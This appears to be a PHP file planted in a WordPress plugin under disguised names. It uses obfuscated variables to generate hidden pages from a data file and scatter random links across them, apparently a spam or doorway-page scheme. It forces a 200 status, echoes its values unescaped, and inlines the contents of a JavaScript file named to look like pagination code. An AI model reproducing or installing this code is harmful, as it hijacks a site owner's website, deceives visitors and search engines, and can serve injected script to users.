<?php
$yfQjShypuk = intval(get_query_var('jlzlgbjlw'));

if ($yfQjShypuk < 1 || $yfQjShypuk > 596) return;
$sIM4bw6Ic = file(plugin_dir_path(__FILE__).'template-html5.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$hpLws = explode(';', $sIM4bw6Ic[$yfQjShypuk]);
if (count($hpLws) < 2) return;
$mtlhZ373 = $hpLws[0];
$eUZuZ2w  = $hpLws[1];
$kbhaHX4Stn = $hpLws[2];
$aOb2q4rJt  = $hpLws[3];
$kbozU = $hpLws[4];
set_query_var('jliyf', $mtlhZ373);

$zZM2ou = '';
$npfS9MQe = plugin_dir_path(__FILE__) . 'urls-vendor/header-themes.php';
if (is_file($npfS9MQe)) {
	$xnuNhck = file($npfS9MQe, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($xnuNhck);
	shuffle($xnuNhck);
	$o5Oqi391 = mt_rand(2, 5);
	if (count($xnuNhck) > $o5Oqi391) {
		for ($q32Ba = 0; $q32Ba < $o5Oqi391; $q32Ba++) {
			$e9ZvQbt = array_shift($xnuNhck);
			$zZM2ou .= '<p><a href="'.$e9ZvQbt.'">'.$e9ZvQbt.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $mtlhZ373; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $eUZuZ2w . "</p>\n";
				if (strlen($aOb2q4rJt) > 0) echo "<p>" . $aOb2q4rJt . "</p>\n";
				if (strlen($kbhaHX4Stn) > 0) echo "<p>" . $kbhaHX4Stn . "</p>\n";
				if (strlen($kbozU) > 0) echo '<p><a href="#"><img src="'.$kbozU.'"></a>' . "</p>\n";
				echo $zZM2ou;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$o98O3UvR = plugin_dir_path(__FILE__) . 'pagination-affiliate.js';
if (is_file($o98O3UvR)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($o98O3UvR);
	echo '</script>';
}
get_footer();
?>
